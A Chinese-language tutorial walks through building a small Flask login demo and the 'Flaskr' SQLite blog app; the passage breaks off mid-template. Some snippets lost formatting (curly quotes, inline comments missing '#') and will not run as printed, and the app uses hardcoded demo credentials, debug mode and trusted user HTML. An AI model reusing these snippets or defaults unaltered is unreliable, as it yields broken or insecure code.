<p>在 app.py 文件中添加如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flash, redirect, url_for, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'shiyanlou'</span> <span class="keyword">or</span> request.form[<span class="string">'password'</span>] != <span class="string">'shiyanlou'</span>:</span><br><span class="line">            flash(<span class="string">'username or password invalid'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, name=<span class="string">'world'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">            name = request.form[<span class="string">'username'</span>]</span><br><span class="line">            flash(<span class="string">'you were logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, name=name))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br></pre></td></tr></table></figure></p>
<p>在 templates/index.html 文件中添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &amp;#123;% for message in get_flashed_messages() %&amp;#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span>&amp;#123;&amp;#123; message &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &amp;#123;% endfor %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &amp;#123;&amp;#123;name&amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在 templates/login.html 文件中添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Flask项目实战之博客开发（一）"><a href="#Flask项目实战之博客开发（一）" class="headerlink" title="Flask项目实战之博客开发（一）"></a>Flask项目实战之博客开发（一）</h1><p>实验源码：<br>wget <a href="http://labfile.oss.aliyuncs.com/courses/29/flaskr.zip" target="_blank" rel="noopener">http://labfile.oss.aliyuncs.com/courses/29/flaskr.zip</a><br>unzip flaskr.zip<br>实验代码建议统一存放在 /home/shiyanlou/Code 目录下。<br>这里我们将博客应用起名为flaskr，也可以取一个不那么 web 2.0 的名字。基本上我们想要它做如下的事情：</p>
<p>根据配置文件中的认证允许用户登录以及注销。仅仅支持一个用户。<br>当用户登录后，他们可以添加新的条目，这些条目是由纯文本的标题和 HTML 的正文构成。因为我们信任用户这里的 HTML 是安全的。<br>页面倒序显示所有条目（新的条目在前），并且用户登入后可以在此添加新条目。<br>我们将在这个应用中直接使用 SQLite 3 因为它足够应付这种规模的应用。对更大的应用使用 SQLAlchemy 是十分有意义的，它以一种更智能方式处理数据库连接，允许你一次连接多个不同的关系数据库。你也可以考虑流行的 NoSQL 数据库，前提是你的数据更适合它们。</p>
<p>这是最终应用的一个截图:</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1cyxv45i1j30qa0eb76c.jpg" alt=""></p>
<p>在开始之前，让我们为这个应用创建需要的文件夹:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/flaskr</span></span><br><span class="line">    <span class="string">/static</span></span><br><span class="line">    <span class="string">/templates</span></span><br></pre></td></tr></table></figure></p>
<p>flaskr：项目总文件夹。其中会存放数据库代码文件 schema.sql 和 主代码文件 flaskr.py。<br>static：项目的资源文件。用于存放 css 和 javascript 文件。<br>templates：项目前端页面文件。用于存放前端页面模板。</p>
<h2 id="数据库模式"><a href="#数据库模式" class="headerlink" title="数据库模式"></a>数据库模式</h2><p>首先我们要创建数据库模式。对于这个应用仅一张表就足够了，而且我们只想支持 SQLite ，所以很简单。在 Code/flaskr 目录下新建 schema.sql 文件并向其中写入如下代码：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> entries;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> entries (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">integer</span> primary <span class="keyword">key</span> autoincrement,</span><br><span class="line">  title <span class="keyword">string</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="built_in">text</span> <span class="keyword">string</span> <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>这个模式由一个称为entries的单表构成，在这个表中每行包含一个id，一个title和一个text。id是一个自增的整数而且是主键，其余两个为非空的字符串。</p>
<h2 id="应用代码"><a href="#应用代码" class="headerlink" title="应用代码"></a>应用代码</h2><p>现在我们已经有了数据库模式了，可以创建应用的模块了。</p>
<p>在 Code/flaskr 目录下新建 flaskr.py 文件。对于小应用，直接把配置放在主模块里，正如我们现在要做的一样，这是可行的。然而一个更干净的解决方案就是单独创建.ini或者.py文件接着加载或者导入里面的值。</p>
<p>在 flaskr.py 文件中写入如下代码:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入所有的模块</span></span><br><span class="line">import sqlite3</span><br><span class="line">from flask import Flask, request, session, g, redirect, url_for, abort, render_template, flash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">DATABASE = '/tmp/flaskr.db'</span><br><span class="line">ENV = 'development'</span><br><span class="line">DEBUG = True</span><br><span class="line">SECRET_KEY = 'development key'</span><br><span class="line">USERNAME = 'admin'</span><br><span class="line">PASSWORD = 'default'</span><br></pre></td></tr></table></figure></p>
<p>，修改 flaskr.py 文件在其中配置初始化:</p>
<h1 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app<span class="selector-class">.config</span><span class="selector-class">.from_object</span>(__name__)</span><br></pre></td></tr></table></figure>
<p>from_object()将会寻找给定的对象(如果它是一个字符串，则会导入它)，搜寻里面定义的全部大写的变量。在我们的这种情况中，配置文件就是我们上面写的几行代码。 你也可以将他们分别存储到多个文件。</p>
<p>通常从配置文件中加载配置是一个好的主意。这时可以使用from_envvar()来实现，可以用它替换上面的from_object()：</p>
<p>app.config.from_envvar(‘FLASKR_SETTINGS’, silent=True)<br>这种方法我们可以设置一个名为FLASKR_SETTINGS的环境变量来设定一个配置文件载入后是否覆盖默认值。静默开关silent=True告诉 Flask 不去关心这个环境变量键值是否存在。</p>
<p>SECRET_KEY是为了保持客户端的会话安全。明智地选择该键，使得它难以猜测，最好是尽可能复杂。</p>
<p>DEBUG 调试标志启用或禁用交互式调试。决不让调试模式在生产系统中启动，因为它将允许用户在服务器上执行代码！</p>
<p>我们还添加了一个轻松地连接到指定数据库的方法，这个方法用于在请求时打开一个连接，并且在交互式 Python shell 和脚本中也能使用，这将方便后面的使用。</p>
<p>在 Code/flaskr.py 文件中继续添加如下代码：</p>
<p>def connect_db():<br>    return sqlite3.connect(app.config[‘DATABASE’])<br>最后如果我们想要把这个文件当做独立应用来运行，只需在服务器启动文件也就是 Code/flaskr.py 文件的末尾添加这一行:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.<span class="built_in">run</span>()</span><br></pre></td></tr></table></figure></p>
<p>如此我们便可以顺利开始运行这个应用，通过使用如下命令:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">python3</span> flaskr.<span class="keyword">py</span></span><br><span class="line"> * Serving Flask app <span class="string">"flaskr"</span> (lazy loading)</span><br><span class="line"> * Environmen<span class="variable">t:</span> development</span><br><span class="line"> * Debug <span class="keyword">mode</span>: <span class="keyword">on</span></span><br><span class="line"> * Running <span class="keyword">on</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/ (Press CTRL+C <span class="keyword">to</span> <span class="keyword">quit</span>)</span><br><span class="line"> * Restarting with stat</span><br><span class="line"> * Debugger <span class="keyword">is</span> active!</span><br><span class="line"> * Debugger PIN: <span class="number">289</span>-<span class="number">075</span>-<span class="number">564</span></span><br></pre></td></tr></table></figure></p>
<p>你将会看到一个信息，信息提示你服务器启动的地址，这个地址你能够访问到的。</p>
<p>当你在浏览器中访问服务器获得一个 404 Not Found 的错误时，是因为我们还没有任何视图。我们之后再来关注这些。首先应该让数据库工作起来。</p>
<h1 id="Flask项目实战之博客开发（二）"><a href="#Flask项目实战之博客开发（二）" class="headerlink" title="Flask项目实战之博客开发（二）"></a>Flask项目实战之博客开发（二）</h1><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>如前面所述，Flaskr 是一个数据库驱动的应用程序，准确地来说，Flaskr 是一个使用关系数据库系统的应用程序。这样的系统需要一个模式告诉它们如何存储信息。因此在首次启动服务器之前，创建数据库模式是很重要的。</p>
<p>可以通过管道把 schema.sql 作为 sqlite 3 命令的输入来创建这个模式，命令如下:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 /tmp/flaskr<span class="selector-class">.db</span> &lt; schema.sql</span><br></pre></td></tr></table></figure></p>
<p>这种方法的缺点是需要安装 sqlite 3 命令，而且你必须提供数据库的路径，否则将报错。由于实验楼环境中没有安装 sqllite3 所以会得到报错command not found: sqlite3。</p>
<p>添加一个函数来对数据库进行初始化是个不错的想法。如果你想要这么做，首先必须从contextlib包中导入contextlib.closing()函数。在 Code/flaskr.py 文件中添加如下代码:<br><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</span><br></pre></td></tr></table></figure></p>
<p>接着我们可以创建一个称为 init_db 函数，该函数用来初始化数据库。为此我们可以使用之前定义的 connect_db 函数。 只要在 Code/flaskr.py 文件中的 connect_db 函数下添加这样的函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> closing(connect_db()) <span class="keyword">as</span> db:</span><br><span class="line">        <span class="keyword">with</span> app.open_resource(<span class="string">'schema.sql'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            db.cursor().executescript(f.read().decode())</span><br><span class="line">        db.commit()</span><br></pre></td></tr></table></figure></p>
<p>closing()函数允许我们在with块中保持数据库连接可用。应用对象的open_resource()方法在其方框外也支持这个功能，因此可以在with块中直接使用。这个函数从当前位置（你的flaskr 文件夹）中打开一个文件，并且允许你读取它。我们在这里用它在数据库连接上执行一个脚本。</p>
<p>当我们连接到数据库时会得到一个数据库连接对象（这里命名它为 db），这个对象提供给我们一个数据库指针。指针上有一个可以执行完整脚本的方法。最后我们不显式地提交更改， SQLite 3 或者其它事务数据库不会这么做。</p>
<p>现在可以在 Python shell 里创建数据库，导入并调用刚才的函数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; from flaskr import init_db</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; init_db()</span><br></pre></td></tr></table></figure></p>
<p>注意:</p>
<p>如果你后面得到一个表不能找到的异常，请检查你是否调用了 init_db 函数以及你的表名是否正确 (例如： singular vs. plural)。</p>
<h2 id="请求数据库连接"><a href="#请求数据库连接" class="headerlink" title="请求数据库连接"></a>请求数据库连接</h2><p>现在我们知道了怎样建立数据库连接以及在脚本中使用这些连接，但是我们如何能优雅地在请求中这么做？</p>
<p>所有我们的函数中都需要数据库连接，因此在请求之前初始化它们，在请求结束后自动关闭它们就很有意义。</p>
<p>Flask 允许我们使用before_request()，after_request()和 teardown_request()装饰器来实现这个功能，在 Code/flaskr.py 文件中添加如下代码:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@app</span>.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    g.db = connect_db()</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.teardown_request</span><br><span class="line">def teardown_request(exception):</span><br><span class="line">    g.db.close()</span><br></pre></td></tr></table></figure></p>
<p>使用before_request()装饰器的函数会在请求之前被调用而且不带参数。使用after_request()装饰器的函数会在请求之后被调用且传入将要发给客户端的响应。</p>
<p>它们必须返回那个响应对象或是不同的响应对象。但当异常抛出时，它们不一定会被执行，这时可以使用teardown_request()装饰器。它装饰的函数将在响应构造后执行，并不允许修改请求，返回的值会被忽略。如果在请求已经被处理的时候抛出异常，它会被传递到每个函数，否则会传入一个None。</p>
<p>我们把当前的数据库连接保存在 Flask 提供的 g 特殊对象中。这个对象只能保存一次请求的信息，并且在每个函数里都可用。不要用其它对象来保存信息，因为在多线程环境下将不可行。特殊的对象 g 在后台有一些神奇的机制来保证它在做正确的事情。</p>
<h1 id="Flask项目实战之博客开发（三）"><a href="#Flask项目实战之博客开发（三）" class="headerlink" title="Flask项目实战之博客开发（三）"></a>Flask项目实战之博客开发（三）</h1><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="显示条目"><a href="#显示条目" class="headerlink" title="显示条目"></a>显示条目</h3><p>这个视图显示所有存储在数据库中的条目。它监听着应用的根地址以及将会从数据库中查询标题和内容。id值最大的条目（最新的条目）将在最前面。从游标返回的行是按select语句中声明的列组织的元组。对于像我们这样的小应用是足够的，但是你可能要把它们转换成字典，如果你对如何转换成字典感兴趣的话，请查阅简化查询例子。</p>
<p>视图函数将会把条目作为字典传入show_entries.html 模板并返回渲染结果。</p>
<p>在 flaskr/flaskr.py 文件中添加如下代码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_entries</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    cur = g.db.execute(<span class="string">'select title, text from entries order by id desc'</span>)    查询语句</span><br><span class="line">    entries = [dict(title=row[<span class="number">0</span>], text=row[<span class="number">1</span>]) <span class="keyword">for</span> row <span class="keyword">in</span> cur.fetchall()]    将查询结果转换为字典</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'show_entries.html'</span>, entries=entries)</span><br></pre></td></tr></table></figure></p>
<h3 id="添加条目"><a href="#添加条目" class="headerlink" title="添加条目"></a>添加条目</h3><p>这个视图允许登录的用户添加新的条目。它只回应POST请求，实际的表单是显示在show_entries页面。如果正常工作的话，我们用flash()向下一个请求闪现一条信息并且跳转回show_entries页面。</p>
<p>在 flaskr/flaskr.py 文件中添加如下代码:</p>
<p>@app.route(‘/add’, methods=[‘POST’])<br>def add_entry():<br>    if not session.get(‘logged_in’):<br>        abort(401)<br>    g.db.execute(‘insert into entries (title, text) values (?, ?)’,[request.form[‘title’], request.form[‘text’]])   # 向数据库中插入数据<br>    g.db.commit()   # 更新数据<br>    flash(‘New entry was successfully posted’)   # 闪现一条消息<br>    return redirect(url_for(‘show_entries’))<br>注意我们这里检查用户登录情况(logged_in键存在会话中，并且为True)。向 SQL 语句中传递参数，需要在语句中使用问号?来代替参数，并把参数放在列表中进行传递。不要使用字符串格式化的方式直接把参数传入 SQL 语句中，这样可能会有潜在的 SQL 注入风险。</p>
<h3 id="登入和注销"><a href="#登入和注销" class="headerlink" title="登入和注销"></a>登入和注销</h3><p>这些函数是用于用户登录以及注销。登录时依据在配置中的值检查用户名和密码并且在会话中设置logged_in键值。如果用户成功登录，logged_in键值被设置成True，并跳转回show_entries页面。此外，会有消息闪现来提示用户登录成功。</p>
<p>如果发生错误，模板会通知，并提示重新登录。在 flaskr/flaskr.py 文件中添加如下代码:<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def login():</span><br><span class="line">    <span class="built_in">error</span> = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != app.<span class="built_in">config</span>[<span class="string">'USERNAME'</span>]:    如果用户名不符合</span><br><span class="line">            <span class="built_in">error</span> = <span class="string">'Invalid username'</span></span><br><span class="line">        elif request.form[<span class="string">'password'</span>] != app.<span class="built_in">config</span>[<span class="string">'PASSWORD'</span>]:    如果密码不符合</span><br><span class="line">            <span class="built_in">error</span> = <span class="string">'Invalid password'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'logged_in'</span>] = True    成功登录，在 session 中添加一个 logged_in 值为 True</span><br><span class="line">            flash(<span class="string">'You were logged in'</span>)    闪现一条消息</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    重定向到首页</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, <span class="built_in">error</span>=<span class="built_in">error</span>)    如果没有成功登录则返回登录页面以及错误信息</span><br></pre></td></tr></table></figure></p>
<p>另一方面，注销函数从会话中移除了logged_in键值。这里我们使用一个大绝招：<br>如果你使用字典的pop()方法并传入第二个参数（默认），这个方法会从字典中删除这个键，如果这个键不存在则什么都不做。这很有用，因为我们不需要检查用户是否已经登入。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/logout'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    session.pop(<span class="string">'logged_in'</span>, None)    移除 logged_in 键</span><br><span class="line">    flash(<span class="string">'You were logged out'</span>)    闪现消息</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    重定向到首页</span><br></pre></td></tr></table></figure></p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>现在我们应该开始编写模板。如果我们现在请求 URLs ，将会得到一个 Flask 无法找到模板的异常。模板使用 Jinja2 语言以及默认开启自动转义。这就意味着除非你使用Markup标记或在模板中使用|safe过滤器，否则 Jinja2 会确保特殊字符比如&lt;或&gt;被转义成等价的XML实体。</p>
<p>我们使用模板继承使得在网站的所有页面中重用布局成为可能。</p>
<p>我们的模板统一存放在Code/flaskr/templates文件夹中。</p>
<h3 id="layout-html"><a href="#layout-html" class="headerlink" title="layout.html"></a>layout.html</h3><p>这个模板包含 HTML 主体结构，标题和一个登录链接（或者当用户已登录则提供注销）。如果有闪现信息的话它也将显示闪现信息。&#123;% block body %&#125; 块能够被子模板中的同样名字(body)的块替代。</p>
<p>session字典在模板中同样可用的，你能用它检查用户是否登录。注意在 Jinja 中你可以访问不存在的对象/字典属性或成员，如同下面的代码，即便 logged_in 键不存在，仍然可以正常工作。</p>
<p>在 flaskr/templates 目录下新建 layout.html 文件并写入如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">stylesheet</span> <span class="attr">type</span>=<span class="string">text/css</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('static', filename='style.css') &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flaskr<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">metanav</span>&gt;</span></span><br><span class="line">  &amp;#123;% if not session.logged_in %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span>&gt;</span>log in<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  &amp;#123;% else %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('logout') &amp;#125;&amp;#125;"</span>&gt;</span>log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &amp;#123;% for message in get_flashed_messages() %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span>&amp;#123;&amp;#123; message &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  &amp;#123;% endfor %&amp;#125;</span><br><span class="line">  &amp;#123;% block body %&amp;#125;&amp;#123;% endblock %&amp;#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="show-entries-html"><a href="#show-entries-html" class="headerlink" title="show_entries.html"></a>show_entries.html</h3><p>这个模板继承了上面的layout.html模板用来显示信息。注意for遍历了所有我们用render_template()函数传入的信息。我们同样告诉表单提交到add_entry函数通过使用 HTTP 的POST方法。</p>
<p>在 flaskr/templates 目录下新建 show_entries.html 文件并写入如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "layout.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  &amp;#123;% if session.logged_in %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('add_entry') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">class</span>=<span class="string">add-entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Title:</span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">size</span>=<span class="string">30</span> <span class="attr">name</span>=<span class="string">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Text:</span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">text</span> <span class="attr">rows</span>=<span class="string">5</span> <span class="attr">cols</span>=<span class="string">40</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span 